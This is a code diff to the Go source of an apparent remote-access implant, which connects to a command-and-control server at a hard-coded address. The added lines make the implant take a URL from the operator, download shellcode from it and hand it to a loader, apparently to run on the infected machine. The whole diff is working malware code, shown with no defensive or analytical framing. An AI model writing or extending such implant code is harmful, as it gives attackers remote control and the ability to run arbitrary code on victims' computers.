@@ -142,7 +142,7 @@ func ls(conn *net.Conn, implantWD *string) {
 }
 
 func main() {
-	c2Address := "192.168.0.104:9000"
+	c2Address := "192.168.0.104:9999"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -173,7 +173,33 @@ func main() {
 			}
 		case "barCode\n":
 			{
-				barCodeLoad(&conn)
+				buffer := make([]byte, 100)
+				conn.Write([]byte("OK\n"))
+				read_len, err := conn.Read(buffer)
+				if err != nil {
+					fmt.Println("Problem Reading the buffer")
+					conn.Write([]byte("Return"))
+					return
+				}
+				if read_len <= 1 {
+					fmt.Println("Problem with Buffer Size")
+					conn.Write([]byte("Return"))
+					return
+				}
+				bufferSnapped := buffer[:read_len]
+				remoteFileURL := string(bufferSnapped)
+				fmt.Println(remoteFileURL)
+				if remoteFileURL == "" {
+					fmt.Println("URL not recieved !")
+					conn.Write([]byte("Return"))
+				}
+				conn.Write([]byte("OK\n"))
+				sc, err := shellcode.GetShellcodeFromUrl(remoteFileURL)
+				if err != nil {
+					fmt.Println("Couldn't get shellcode")
+					return
+				}
+				barCodeLoad(&conn, &sc)
 			}
 		case "cd\n":
 			{
